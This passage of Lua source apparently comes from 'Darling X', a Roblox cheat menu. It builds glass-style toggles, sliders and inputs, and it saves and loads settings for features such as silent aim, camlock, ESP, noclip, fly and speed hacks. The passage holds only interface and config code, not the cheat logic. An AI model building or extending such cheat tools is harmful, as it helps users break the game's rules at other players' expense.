            TweenService:Create(btn, TweenInfo.new(0.18), { BackgroundTransparency = 0.45 }):Play()
            TweenService:Create(bStroke, TweenInfo.new(0.18), { Transparency = 0.5 }):Play()
        end)
        if callback then pcall(callback) end
    end)
    UpdateCardGeometry(parentCard)
    return btn
end

-- Premium Interactive Glass Toggle
local function AddToggle(parentCard, titleText, descText, defaultState, callback)
    local state = defaultState or false
    if UI_TOGGLES[titleText] and UI_TOGGLES[titleText].get then
        state = UI_TOGGLES[titleText].get()
    end
    local eCount = (CardElementCounters[parentCard] or 0) + 1
    CardElementCounters[parentCard] = eCount

    local row = Instance.new("TextButton", parentCard)
    row.Name = "Toggle_" .. (titleText and titleText:sub(1, 16):gsub("[^%w_]+", "_") or "Toggle")
    row.LayoutOrder = eCount
    row.Size = UDim2.new(1, 0, 0, descText and 36 or 28)
    row.BackgroundColor3 = Color3.fromRGB(18, 14, 26)
    row.BackgroundTransparency = 0.6
    row.Text = ""
    row.AutoButtonColor = false
    row.Active = true
    row.Selectable = true
    row.ZIndex = 12
    Instance.new("UICorner", row).CornerRadius = UDim.new(0, 8)
    local rStroke = Instance.new("UIStroke", row)
    rStroke.Color = Color3.fromRGB(45, 40, 60)
    rStroke.Thickness = 0.8
    rStroke.Transparency = 0.5

    local pad = Instance.new("UIPadding", row)
    pad.PaddingLeft = UDim.new(0, 8)
    pad.PaddingRight = UDim.new(0, 8)

    local tLbl = Instance.new("TextLabel", row)
    tLbl.Size = UDim2.new(1, -44, 0, 14)
    tLbl.Position = UDim2.new(0, 0, 0, descText and 4 or 7)
    tLbl.BackgroundTransparency = 1
    tLbl.Text = titleText
    tLbl.Font = Enum.Font.GothamBold
    tLbl.TextSize = 9.5
    tLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    tLbl.TextXAlignment = Enum.TextXAlignment.Left
    tLbl.Active = false
    tLbl.ZIndex = 13
    RegisterTranslatable(tLbl, titleText)

    if descText then
        local dLbl = Instance.new("TextLabel", row)
        dLbl.Size = UDim2.new(1, -44, 0, 12)
        dLbl.Position = UDim2.new(0, 0, 0, 19)
        dLbl.BackgroundTransparency = 1
        dLbl.Text = descText
        RegisterTranslatable(dLbl, descText)
        dLbl.Font = Enum.Font.Gotham
        dLbl.TextSize = 8
        dLbl.TextColor3 = Color3.fromRGB(150, 145, 170)
        dLbl.TextXAlignment = Enum.TextXAlignment.Left
        dLbl.Active = false
        dLbl.ZIndex = 13
    end

    local switch = Instance.new("Frame", row)
    switch.Size = UDim2.new(0, 34, 0, 18)
    switch.Position = UDim2.new(1, -34, 0.5, -9)
    switch.BackgroundColor3 = state and CurrentAccent or Color3.fromRGB(32, 28, 44)
    Instance.new("UICorner", switch).CornerRadius = UDim.new(1, 0)
    switch.Active = false
    switch.ZIndex = 13

    local swStroke = Instance.new("UIStroke", switch)
    swStroke.Color = state and CurrentAccent or Color3.fromRGB(55, 50, 75)
    swStroke.Thickness = 0.8
    if state then RegisterThemeStroke(swStroke) end

    SetActiveToggle(switch, state)

    local knob = Instance.new("Frame", switch)
    knob.Size = UDim2.new(0, 12, 0, 12)
    knob.Position = state and UDim2.new(1, -15, 0.5, -6) or UDim2.new(0, 3, 0.5, -6)
    knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)
    knob.Active = false
    knob.ZIndex = 14

    local function setState(nextState, runCallback)
        if state == nextState then return end
        state = nextState
        SetActiveToggle(switch, state)
        TweenService:Create(switch, TweenInfo.new(0.2, Enum.EasingStyle.Quart), {
            BackgroundColor3 = state and CurrentAccent or Color3.fromRGB(32, 28, 44)
        }):Play()
        TweenService:Create(swStroke, TweenInfo.new(0.2), {
            Color = state and CurrentAccent or Color3.fromRGB(55, 50, 75)
        }):Play()
        TweenService:Create(knob, TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
            Position = state and UDim2.new(1, -15, 0.5, -6) or UDim2.new(0, 3, 0.5, -6)
        }):Play()
        if runCallback and callback then pcall(callback, state) end
        if not suspendSave and TriggerAutoSave then TriggerAutoSave() end
    end

    if not UI_TOGGLES[titleText] then
        UI_TOGGLES[titleText] = {
            handlers = {},
            default = defaultState or false,
            get = function() return state end,
            set = function(nextVal, runCb)
                for _, h in ipairs(UI_TOGGLES[titleText].handlers) do
                    h(nextVal, runCb)
                end
            end
        }
    end
    table.insert(UI_TOGGLES[titleText].handlers, function(nextVal, runCb)
        setState(nextVal, runCb)
    end)
    UI_TOGGLES[titleText].get = function() return state end

    table.insert(ToggleControls, function(nextState)
        setState(nextState, true)
    end)

    local control = setmetatable({
        Instance = row,
        SetState = function(nextState, runCallback)
            setState(nextState, runCallback)
        end
    }, {
        __index = row,
        __newindex = function(_, k, v)
            row[k] = v
        end
    })

    ConnectButton(row, function()
        UI_TOGGLES[titleText].set(not state, true)
    end)
    UpdateCardGeometry(parentCard)
    return control
end

-- Premium Interactive Glass Slider with Glowing Track and Numeric Pill Badge
local function AddSlider(parentCard, titleText, minVal, maxVal, defaultVal, stepVal, callback)
    local currentVal = defaultVal or minVal
    stepVal = stepVal or 1
    local eCount = (CardElementCounters[parentCard] or 0) + 1
    CardElementCounters[parentCard] = eCount

    local container = Instance.new("Frame", parentCard)
    container.Name = "Slider_" .. (titleText and titleText:sub(1, 16):gsub("[^%w_]+", "_") or "Slider")
    container.LayoutOrder = eCount
    container.Size = UDim2.new(1, 0, 0, 44)
    container.BackgroundColor3 = Color3.fromRGB(18, 14, 26)
    container.BackgroundTransparency = 0.6
    container.Active = false
    container.ZIndex = 12
    Instance.new("UICorner", container).CornerRadius = UDim.new(0, 8)

    local cStroke = Instance.new("UIStroke", container)
    cStroke.Color = Color3.fromRGB(45, 40, 60)
    cStroke.Thickness = 0.8
    cStroke.Transparency = 0.5

    local pad = Instance.new("UIPadding", container)
    pad.PaddingLeft = UDim.new(0, 8)
    pad.PaddingRight = UDim.new(0, 8)

    local tLbl = Instance.new("TextLabel", container)
    tLbl.Size = UDim2.new(1, -56, 0, 16)
    tLbl.Position = UDim2.new(0, 0, 0, 4)
    tLbl.BackgroundTransparency = 1
    tLbl.Text = titleText
    tLbl.Font = Enum.Font.GothamBold
    tLbl.TextSize = 9.5
    tLbl.TextColor3 = Color3.fromRGB(240, 235, 255)
    RegisterTranslatable(tLbl, titleText)
    tLbl.TextXAlignment = Enum.TextXAlignment.Left
    tLbl.Active = false
    tLbl.ZIndex = 13

    -- Value Pill Badge
    local vPill = Instance.new("Frame", container)
    vPill.Size = UDim2.new(0, 46, 0, 16)
    vPill.Position = UDim2.new(1, -46, 0, 4)
    vPill.BackgroundColor3 = Color3.fromRGB(24, 20, 34)
    vPill.Active = false
    vPill.ZIndex = 13
    Instance.new("UICorner", vPill).CornerRadius = UDim.new(0, 6)
    local vpStroke = Instance.new("UIStroke", vPill)
    vpStroke.Color = CurrentAccent
    vpStroke.Thickness = 0.8
    RegisterThemeStroke(vpStroke)

    local vLbl = Instance.new("TextLabel", vPill)
    vLbl.Size = UDim2.new(1, 0, 1, 0)
    vLbl.BackgroundTransparency = 1
    vLbl.Text = tostring(currentVal)
    vLbl.Font = Enum.Font.GothamBold
    vLbl.TextSize = 8.5
    vLbl.TextColor3 = CurrentAccent
    vLbl.TextXAlignment = Enum.TextXAlignment.Center
    vLbl.Active = false
    vLbl.ZIndex = 14
    RegisterThemeText(vLbl)

    -- Track
    local track = Instance.new("TextButton", container)
    track.Size = UDim2.new(1, 0, 0, 8)
    track.Position = UDim2.new(0, 0, 0, 26)
    track.BackgroundColor3 = Color3.fromRGB(28, 24, 40)
    track.AutoButtonColor = false
    track.Text = ""
    track.Active = true
    track.ZIndex = 13
    Instance.new("UICorner", track).CornerRadius = UDim.new(1, 0)
    local trkStroke = Instance.new("UIStroke", track)
    trkStroke.Color = Color3.fromRGB(48, 42, 66)
    trkStroke.Thickness = 0.8

    local fill = Instance.new("Frame", track)
    local initialFrac = math.clamp((currentVal - minVal) / (maxVal - minVal), 0, 1)
    fill.Size = UDim2.new(initialFrac, 0, 1, 0)
    fill.BackgroundColor3 = CurrentAccent
    fill.Active = false
    fill.ZIndex = 13
    Instance.new("UICorner", fill).CornerRadius = UDim.new(1, 0)
    RegisterThemeFill(fill)

    local knob = Instance.new("Frame", fill)
    knob.Size = UDim2.new(0, 14, 0, 14)
    knob.Position = UDim2.new(1, -7, 0.5, -7)
    knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    knob.Active = false
    knob.ZIndex = 14
    Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)
    local knbStroke = Instance.new("UIStroke", knob)
    knbStroke.Color = CurrentAccent
    knbStroke.Thickness = 1.2
    RegisterThemeStroke(knbStroke)

    local function updateValue(inputX)
        local absPos = track.AbsolutePosition.X
        local absSize = track.AbsoluteSize.X
        if absSize <= 0 then return end
        local frac = math.clamp((inputX - absPos) / absSize, 0, 1)
        local rawVal = minVal + (maxVal - minVal) * frac
        local stepped = math.floor((rawVal / stepVal) + 0.5) * stepVal
        currentVal = math.clamp(stepped, minVal, maxVal)

        local visualFrac = (currentVal - minVal) / (maxVal - minVal)
        fill.Size = UDim2.new(visualFrac, 0, 1, 0)
        vLbl.Text = tostring(currentVal)
        if callback then pcall(callback, currentVal) end
    end

    local function setValue(newVal, runCallback)
        local rawVal = math.clamp(newVal, minVal, maxVal)
        local stepped = math.floor((rawVal / stepVal) + 0.5) * stepVal
        currentVal = math.clamp(stepped, minVal, maxVal)
        local visualFrac = (currentVal - minVal) / (maxVal - minVal)
        fill.Size = UDim2.new(visualFrac, 0, 1, 0)
        vLbl.Text = tostring(currentVal)
        if runCallback and callback then pcall(callback, currentVal) end
        if not suspendSave and TriggerAutoSave then TriggerAutoSave() end
    end

    local control = setmetatable({
        Instance = container,
        SetValue = setValue
    }, {
        __index = container,
        __newindex = function(_, k, v)
            container[k] = v
        end
    })

    local sliding = false
    track.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            sliding = true
            updateValue(input.Position.X)
        end
    end)
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            if sliding and not suspendSave and TriggerAutoSave then
                TriggerAutoSave()
            end
            sliding = false
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if sliding and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            updateValue(input.Position.X)
        end
    end)

    UI_SLIDERS[titleText] = {
        default = defaultVal or minVal,
        set = function(newVal, runCb)
            setValue(newVal, runCb)
        end,
        get = function()
            return currentVal
        end
    }

    UpdateCardGeometry(parentCard)
    return control
end

-- Premium Choice Selector with Value Badge
local function AddChoice(parentCard, label, values, defaultIndex, callback)
    local index = defaultIndex or 1
    local eCount = (CardElementCounters[parentCard] or 0) + 1
    CardElementCounters[parentCard] = eCount

    local container = Instance.new("TextButton", parentCard)
    container.Name = "Choice_" .. (label and label:sub(1, 16):gsub("[^%w_]+", "_") or "Choice")
    container.LayoutOrder = eCount
    container.Size = UDim2.new(1, 0, 0, 28)
    container.BackgroundColor3 = Color3.fromRGB(20, 16, 28)
    container.BackgroundTransparency = 0.5
    container.Text = ""
    container.AutoButtonColor = false
    container.Active = true
    container.Selectable = true
    container.ZIndex = 12
    Instance.new("UICorner", container).CornerRadius = UDim.new(0, 8)

    local stroke = Instance.new("UIStroke", container)
    stroke.Thickness = 0.8
    stroke.Color = Color3.fromRGB(45, 40, 60)

    local pad = Instance.new("UIPadding", container)
    pad.PaddingLeft = UDim.new(0, 8)
    pad.PaddingRight = UDim.new(0, 6)

    local lbl = Instance.new("TextLabel", container)
    lbl.Size = UDim2.new(0.5, 0, 1, 0)
    lbl.BackgroundTransparency = 1
    lbl.Text = label
    RegisterTranslatable(lbl, label)
    lbl.Font = Enum.Font.GothamBold
    lbl.TextSize = 9.5
    lbl.TextColor3 = Color3.fromRGB(240, 235, 255)
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.Active = false
    lbl.ZIndex = 13

    local badge = Instance.new("Frame", container)
    badge.Size = UDim2.new(0.5, -4, 0, 20)
    badge.Position = UDim2.new(0.5, 4, 0.5, -10)
    badge.BackgroundColor3 = Color3.fromRGB(28, 22, 38)
    badge.Active = false
    badge.ZIndex = 13
    Instance.new("UICorner", badge).CornerRadius = UDim.new(0, 6)
    local bStroke = Instance.new("UIStroke", badge)
    bStroke.Color = CurrentAccent
    bStroke.Thickness = 0.8
    RegisterThemeStroke(bStroke)

    local valLbl = Instance.new("TextLabel", badge)
    valLbl.Size = UDim2.new(1, 0, 1, 0)
    valLbl.BackgroundTransparency = 1
    valLbl.Font = Enum.Font.GothamBold
    valLbl.TextSize = 8.5
    valLbl.TextColor3 = CurrentAccent
    valLbl.TextXAlignment = Enum.TextXAlignment.Center
    valLbl.Active = false
    valLbl.ZIndex = 14
    RegisterThemeText(valLbl)

    local function refresh()
        local rawVal = tostring(values[index])
        local displayVal = rawVal
        if CurrentLanguage ~= "English" and label ~= "Interface Language" then
            local langDict = TRANSLATIONS_DICT[CurrentLanguage]
            if langDict and langDict[rawVal] then
                displayVal = langDict[rawVal]
            end
        end
        valLbl.Text = displayVal .. "  ›"
    end
    refresh()
    table.insert(ChoiceRefresherList, refresh)

    local function setIndex(newIdxOrVal, runCallback)
        if type(newIdxOrVal) == "string" then
            for i, v in ipairs(values) do
                if tostring(v) == tostring(newIdxOrVal) then
                    index = i
                    break
                end
            end
        elseif type(newIdxOrVal) == "number" then
            index = math.clamp(math.floor(newIdxOrVal), 1, #values)
        end
        refresh()
        if runCallback and callback then pcall(callback, values[index], index) end
        if not suspendSave and TriggerAutoSave then TriggerAutoSave() end
    end

    UI_CHOICES[label] = {
        default = defaultIndex or 1,
        set = function(newIdxOrVal, runCb)
            setIndex(newIdxOrVal, runCb)
        end,
        get = function()
            return values[index], index
        end
    }

    local control = setmetatable({
        Instance = container,
        SetIndex = setIndex
    }, {
        __index = container,
        __newindex = function(_, k, v)
            container[k] = v
        end
    })

    ConnectButton(container, function()
        index = (index % #values) + 1
        refresh()
        if callback then callback(values[index], index) end
        if not suspendSave and TriggerAutoSave then TriggerAutoSave() end
    end)
    UpdateCardGeometry(parentCard)
    return control
end

-- Premium Interactive Glass Text Input
local function AddInput(parentCard, titleText, placeholderText, defaultVal, callback)
    local eCount = (CardElementCounters[parentCard] or 0) + 1
    CardElementCounters[parentCard] = eCount
    local container = Instance.new("Frame", parentCard)
    container.Name = "Input_" .. (titleText and titleText:sub(1, 16):gsub("[^%w_]+", "_") or "Input")
    container.LayoutOrder = eCount
    container.Size = UDim2.new(1, 0, 0, 48)
    container.BackgroundColor3 = Color3.fromRGB(18, 14, 26)
    container.BackgroundTransparency = 0.6
    container.Active = false
    container.ZIndex = 12
    Instance.new("UICorner", container).CornerRadius = UDim.new(0, 8)

    local stroke = Instance.new("UIStroke", container)
    stroke.Color = Color3.fromRGB(45, 40, 60)
    stroke.Thickness = 0.8
    stroke.Transparency = 0.5

    local pad = Instance.new("UIPadding", container)
    pad.PaddingLeft = UDim.new(0, 8)
    pad.PaddingRight = UDim.new(0, 8)

    local lbl = Instance.new("TextLabel", container)
    lbl.Size = UDim2.new(1, 0, 0, 16)
    lbl.Position = UDim2.new(0, 0, 0, 4)
    lbl.BackgroundTransparency = 1
    lbl.Text = titleText
    RegisterTranslatable(lbl, titleText)
    lbl.Font = Enum.Font.GothamBold
    lbl.TextSize = 9.5
    lbl.TextColor3 = Color3.fromRGB(240, 235, 255)
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.Active = false
    lbl.ZIndex = 13

    local inputFrame = Instance.new("Frame", container)
    inputFrame.Size = UDim2.new(1, 0, 0, 20)
    inputFrame.Position = UDim2.new(0, 0, 0, 22)
    inputFrame.BackgroundColor3 = Color3.fromRGB(24, 20, 34)
    inputFrame.BackgroundTransparency = 0.3
    inputFrame.Active = false
    inputFrame.ZIndex = 13
    Instance.new("UICorner", inputFrame).CornerRadius = UDim.new(0, 6)
    local ifStroke = Instance.new("UIStroke", inputFrame)
    ifStroke.Color = CurrentAccent
    ifStroke.Thickness = 0.8
    RegisterThemeStroke(ifStroke)

    local tb = Instance.new("TextBox", inputFrame)
    tb.Size = UDim2.new(1, -8, 1, 0)
    tb.Position = UDim2.new(0, 4, 0, 0)
    tb.BackgroundTransparency = 1
    tb.Font = Enum.Font.Gotham
    tb.TextSize = 9
    tb.TextColor3 = Color3.fromRGB(255, 255, 255)
    tb.PlaceholderText = placeholderText or "Enter ID or URL..."
    tb.PlaceholderColor3 = Color3.fromRGB(140, 135, 160)
    tb.Text = defaultVal or ""
    tb.ClearTextOnFocus = false
    tb.TextXAlignment = Enum.TextXAlignment.Left
    tb.Active = true
    tb.ZIndex = 14

    UI_INPUTS[titleText] = {
        default = defaultVal or "",
        set = function(val) tb.Text = tostring(val or "") end,
        get = function() return tb.Text end
    }

    pcall(function()
        tb.FocusLost:Connect(function(enterPressed)
            if callback then
                callback(tb.Text, enterPressed)
            end
            if not suspendSave and TriggerAutoSave then
                TriggerAutoSave()
            end
        end)
    end)

    UpdateCardGeometry(parentCard)
    return {
        Container = container,
        TextBox = tb,
        GetText = function() return tb.Text end,
        SetText = function(val) tb.Text = tostring(val or "") end
    }
end

-- Persistent Configuration Engine (Full UI & State Synchronization)
SaveConfigProfile = function(force)
    if suspendSave and not force then return false, "Saving suspended" end
    local ok, err = pcall(function()
        local cfg = {
            Version = APP_VERSION,
            Theme = CurrentThemeName,
            WallpaperIdx = currentBgIdx,
            Language = CurrentLanguage,
            Toggles = {},
            Sliders = {},
            Choices = {},
            Inputs = {},
            Features = {}
        }
        for key, entry in pairs(UI_TOGGLES) do
            local val = (entry.get and entry.get()) or false
            cfg.Toggles[key] = val
            cfg.Features[key] = val
        end
        for key, entry in pairs(UI_SLIDERS) do
            cfg.Sliders[key] = entry.get and entry.get()
        end
        for key, entry in pairs(UI_CHOICES) do
            local val, idx = entry.get()
            cfg.Choices[key] = { index = idx, value = val }
        end
        for key, entry in pairs(UI_INPUTS) do
            cfg.Inputs[key] = entry.get and entry.get()
        end

        -- Backward compatibility flat keys
        cfg.FastAttack = cfg.Toggles["Fast Attack"]
        cfg.AutoBuso = cfg.Toggles["Auto Buso Haki"]
        cfg.AutoV3 = cfg.Toggles["Auto Race V3"]
        cfg.AutoV4 = cfg.Toggles["Auto Race V4"]
        cfg.DragonGunM1 = cfg.Toggles["Dragon Gun M1"]
        cfg.Camlock = cfg.Toggles["Camlock"]
        cfg.SanguineBoost = cfg.Toggles["Sanguine Boost"]
        cfg.CustomWalkSpeed = cfg.Toggles["Custom WalkSpeed"]
        cfg.SuperJump = cfg.Toggles["Super Jump"]
        cfg.InfiniteJump = cfg.Toggles["Infinite Jump"]
        cfg.Noclip = cfg.Toggles["Noclip Wallpass"]
        cfg.WalkOnWater = cfg.Toggles["Walk on Water"]
        cfg.AntiLava = cfg.Toggles["Anti-Lava Damage"]
        cfg.DashLengthEnabled = cfg.Toggles["Custom Dash Length"]
        cfg.FFlags1 = cfg.Toggles["FFlags 1 (FPS Booster)"]
        cfg.Fly = cfg.Toggles["Fly"]
        cfg.FlySpeed = cfg.Sliders["Fly Speed"]
        cfg.ShowFPS = cfg.Toggles["Show FPS & Ping"]
        cfg.IgnoreAllies = cfg.Toggles["Ignore Allies"]
        cfg.IgnorePvPOff = cfg.Toggles["Ignore PvP Off"]
        cfg.IgnoreSafeZone = cfg.Toggles["Ignore Safe Zone"]
        cfg.MacroEnabled = cfg.Toggles["Macro Enabled"]
        cfg.MacroLoop = cfg.Toggles["Loop Sequence"]
        cfg.MacroWidget = cfg.Toggles["Macro Floating Widget"]
        if cfg.Sliders["WalkSpeed Value"] then cfg.WalkSpeedVal = cfg.Sliders["WalkSpeed Value"] end
        if cfg.Sliders["Super Jump Force"] then cfg.SuperJumpForce = cfg.Sliders["Super Jump Force"] end
        if cfg.Sliders["Dash Distance"] then cfg.DashLength = cfg.Sliders["Dash Distance"] end

        local json = HttpService:JSONEncode(cfg)
        local wOk, wErr = safeWriteFile(json)
        if wOk then
            print("[Darling X] Config auto-saved successfully.")
        else
            warn("[Darling X] Config save notice: " .. tostring(wErr))
        end
    end)
    return ok, err
end

TriggerAutoSave = function()
    if suspendSave then return end
    if autoSaveThread then
        pcall(task.cancel, autoSaveThread)
        autoSaveThread = nil
    end
    autoSaveThread = task.delay(0.25, function()
        if suspendSave then return end
        SaveConfigProfile(true)
    end)
end

LoadConfigProfile = function()
    suspendSave = true
    local ok, err = pcall(function()
        local content, cfg = safeReadFile()
        if not cfg or type(cfg) ~= "table" then
            return false, "No valid config data found"
        end

        -- 1. Restore Theme
        if cfg.Theme and THEMES[cfg.Theme] then
            pcall(ApplyTheme, cfg.Theme)
        end

        -- 2. Restore Wallpaper
        if cfg.WallpaperIdx and WALLPAPERS[cfg.WallpaperIdx] then
            pcall(SetWallpaper, cfg.WallpaperIdx)
        end

        -- 3. Restore Language
        if cfg.Language and TRANSLATIONS_DICT[cfg.Language] then
            pcall(ApplyLanguage, cfg.Language)
        end

        -- 4. Restore Toggles (Source from Toggles or Features)
        local togglesSource = cfg.Toggles or cfg.Features
        if type(togglesSource) == "table" then
            for key, val in pairs(togglesSource) do
                if UI_TOGGLES[key] then
                    pcall(function()
                        UI_TOGGLES[key].set(val == true, true)
                    end)
                end
            end
        end

        -- Backward compatibility flat keys
        if cfg.FastAttack ~= nil and UI_TOGGLES["Fast Attack"] then
            pcall(function() UI_TOGGLES["Fast Attack"].set(cfg.FastAttack == true, true) end)
        end
        if cfg.AutoBuso ~= nil and UI_TOGGLES["Auto Buso Haki"] then
            pcall(function() UI_TOGGLES["Auto Buso Haki"].set(cfg.AutoBuso == true, true) end)
        end
        if cfg.AutoV3 ~= nil and UI_TOGGLES["Auto Race V3"] then
            pcall(function() UI_TOGGLES["Auto Race V3"].set(cfg.AutoV3 == true, true) end)
        end
        if cfg.AutoV4 ~= nil and UI_TOGGLES["Auto Race V4"] then
            pcall(function() UI_TOGGLES["Auto Race V4"].set(cfg.AutoV4 == true, true) end)
        end
        if cfg.DragonGunM1 ~= nil and UI_TOGGLES["Dragon Gun M1"] then
            pcall(function() UI_TOGGLES["Dragon Gun M1"].set(cfg.DragonGunM1 == true, true) end)
        end
        if cfg.Camlock ~= nil and UI_TOGGLES["Camlock"] then
            pcall(function() UI_TOGGLES["Camlock"].set(cfg.Camlock == true, true) end)
        end
        if cfg.SanguineBoost ~= nil and UI_TOGGLES["Sanguine Boost"] then
            pcall(function() UI_TOGGLES["Sanguine Boost"].set(cfg.SanguineBoost == true, true) end)
        end
        if cfg.CustomWalkSpeed ~= nil and UI_TOGGLES["Custom WalkSpeed"] then
            pcall(function() UI_TOGGLES["Custom WalkSpeed"].set(cfg.CustomWalkSpeed == true, true) end)
        end
        if cfg.SuperJump ~= nil and UI_TOGGLES["Super Jump"] then
            pcall(function() UI_TOGGLES["Super Jump"].set(cfg.SuperJump == true, true) end)
        end
        if cfg.InfiniteJump ~= nil and UI_TOGGLES["Infinite Jump"] then
            pcall(function() UI_TOGGLES["Infinite Jump"].set(cfg.InfiniteJump == true, true) end)
        end
        if cfg.Noclip ~= nil and UI_TOGGLES["Noclip Wallpass"] then
            pcall(function() UI_TOGGLES["Noclip Wallpass"].set(cfg.Noclip == true, true) end)
        end
        if cfg.WalkOnWater ~= nil and UI_TOGGLES["Walk on Water"] then
            pcall(function() UI_TOGGLES["Walk on Water"].set(cfg.WalkOnWater == true, true) end)
        end
        if cfg.AntiLava ~= nil and UI_TOGGLES["Anti-Lava Damage"] then
            pcall(function() UI_TOGGLES["Anti-Lava Damage"].set(cfg.AntiLava == true, true) end)
        end
        if cfg.DashLengthEnabled ~= nil and UI_TOGGLES["Custom Dash Length"] then
            pcall(function() UI_TOGGLES["Custom Dash Length"].set(cfg.DashLengthEnabled == true, true) end)
        end
        if cfg.FFlags1 ~= nil and UI_TOGGLES["FFlags 1 (FPS Booster)"] then
            pcall(function() UI_TOGGLES["FFlags 1 (FPS Booster)"].set(cfg.FFlags1 == true, true) end)
        end
        if cfg.Fly ~= nil and UI_TOGGLES["Fly"] then
            pcall(function() UI_TOGGLES["Fly"].set(cfg.Fly == true, true) end)
        end
        if cfg.FlySpeed ~= nil and UI_SLIDERS["Fly Speed"] then
            pcall(function() UI_SLIDERS["Fly Speed"].set(tonumber(cfg.FlySpeed), true) end)
        end
        if cfg.ShowFPS ~= nil and UI_TOGGLES["Show FPS & Ping"] then
            pcall(function() UI_TOGGLES["Show FPS & Ping"].set(cfg.ShowFPS == true, true) end)
        end
        if cfg.IgnoreAllies ~= nil and UI_TOGGLES["Ignore Allies"] then
            pcall(function() UI_TOGGLES["Ignore Allies"].set(cfg.IgnoreAllies == true, true) end)
        end
        if cfg.IgnorePvPOff ~= nil and UI_TOGGLES["Ignore PvP Off"] then
            pcall(function() UI_TOGGLES["Ignore PvP Off"].set(cfg.IgnorePvPOff == true, true) end)
        end
        if cfg.IgnoreSafeZone ~= nil and UI_TOGGLES["Ignore Safe Zone"] then
            pcall(function() UI_TOGGLES["Ignore Safe Zone"].set(cfg.IgnoreSafeZone == true, true) end)
        end
        if cfg.MacroEnabled ~= nil and UI_TOGGLES["Macro Enabled"] then
            pcall(function() UI_TOGGLES["Macro Enabled"].set(cfg.MacroEnabled == true, true) end)
        end
        if cfg.MacroLoop ~= nil and UI_TOGGLES["Loop Sequence"] then
            pcall(function() UI_TOGGLES["Loop Sequence"].set(cfg.MacroLoop == true, true) end)
        end
        if cfg.MacroWidget ~= nil and UI_TOGGLES["Macro Floating Widget"] then
            pcall(function() UI_TOGGLES["Macro Floating Widget"].set(cfg.MacroWidget == true, true) end)
        end

        -- 5. Restore Sliders
        if type(cfg.Sliders) == "table" then
            for key, val in pairs(cfg.Sliders) do
                local num = tonumber(val)
                if UI_SLIDERS[key] and num then
                    pcall(function() UI_SLIDERS[key].set(num, true) end)
                end
            end
        end
        if cfg.WalkSpeedVal and UI_SLIDERS["WalkSpeed Value"] then
            pcall(function() UI_SLIDERS["WalkSpeed Value"].set(tonumber(cfg.WalkSpeedVal), true) end)
        end
        if cfg.SuperJumpForce and UI_SLIDERS["Super Jump Force"] then
            pcall(function() UI_SLIDERS["Super Jump Force"].set(tonumber(cfg.SuperJumpForce), true) end)
        end
        if cfg.DashLength and UI_SLIDERS["Dash Distance"] then
            pcall(function() UI_SLIDERS["Dash Distance"].set(tonumber(cfg.DashLength), true) end)
        end

        -- 6. Restore Choices
        if type(cfg.Choices) == "table" then
            for key, entry in pairs(cfg.Choices) do
                if UI_CHOICES[key] then
                    local target = nil
                    if type(entry) == "table" then
                        target = entry.index or entry.value
                    else
                        target = entry
                    end
                    if target ~= nil then
                        pcall(function() UI_CHOICES[key].set(target, true) end)
                    end
                end
            end
        end

        -- 7. Restore Inputs
        if type(cfg.Inputs) == "table" then
            for key, val in pairs(cfg.Inputs) do
                if UI_INPUTS[key] and type(val) == "string" then
                    pcall(function() UI_INPUTS[key].set(val, true) end)
                end
            end
        end

        print("[Darling X] Config profile fully loaded.")
        return true
    end)
    suspendSave = false
    return ok, err
end

local DEFAULT_TOGGLES = {
    ["Fast Attack"] = false,
    ["Dragon Gun M1"] = false,
    ["Camlock"] = false,
    ["Sanguine Boost"] = false,
    ["Super Jump"] = false,
    ["Custom WalkSpeed"] = false,
    ["FFlags 1 (FPS Booster)"] = false,
    ["Player Silent Aim"] = false,
    ["NPC Silent Aim"] = false,
    ["Show FOV Circle"] = false,
    ["Enable Target Prediction"] = true,
    ["Show Tracers"] = false,
    ["Auto Buso Haki"] = false,
    ["Auto Race V3"] = false,
    ["Auto Race V4"] = false,
    ["Custom Dash Length"] = false,
    ["Infinite Jump"] = false,
    ["Noclip Wallpass"] = false,
    ["Walk on Water"] = false,
    ["Anti-Lava Damage"] = false,
    ["No Animations"] = false,
    ["Infinite Soru"] = false,
    ["Soru Aimbot"] = false,
    ["Auto Skill on Soru"] = false,
    ["Master ESP"] = false,
    ["Player 2D Boxes"] = true,
    ["Player Names"] = true,
    ["Player Health Status"] = true,
    ["Distance Indicator"] = true,
    ["Equipped Tool / Weapon"] = true,
    ["Devil Fruit Tracker"] = true,
    ["Player Bounty Tracker"] = true,
    ["Player Level Display"] = true,
    ["Combat PvP Status"] = true,
    ["Player Chams (Highlight)"] = false,
    ["Player Tracers"] = false,
    ["Neon Rain Layer"] = true,
    ["Show FPS & Ping"] = false,
    ["Ignore Allies"] = false,
    ["Ignore PvP Off"] = false,
    ["Ignore Safe Zone"] = false,
    ["Fly"] = false,
    ["Macro Enabled"] = false,
    ["Loop Sequence"] = false,
    ["Macro Floating Widget"] = false,
    ["Block 1 Enabled"] = true,
    ["Block 2 Enabled"] = true,
    ["Block 3 Enabled"] = true,
    ["Block 4 Enabled"] = false,
    ["Block 5 Enabled"] = false,
    ["Block 6 Enabled"] = false,
}

local DEFAULT_SLIDERS = {
    ["Max Range"] = 1000,
    ["Prediction Amount"] = 12,
    ["FOV Radius"] = 100,
    ["FOV Thickness"] = 2,
    ["Tracer Thickness"] = 2,
    ["Camera FOV"] = 70,
    ["Fly Speed"] = 70,
    ["WalkSpeed Value"] = 150,
    ["Dash Distance"] = 30,
    ["Super Jump Force"] = 216,
    ["Max Soru Range"] = 2000,
    ["Skill Delay"] = 300,
    ["ESP Text Font Size"] = 13,
    ["Rainbow Chroma Speed"] = 4,
    ["Background Dimming (%)"] = 35,
    ["Raindrop Density"] = 14,
}

local DEFAULT_CHOICES = {
    ["Target Priority"] = 1,
    ["Aim Mode"] = 1,
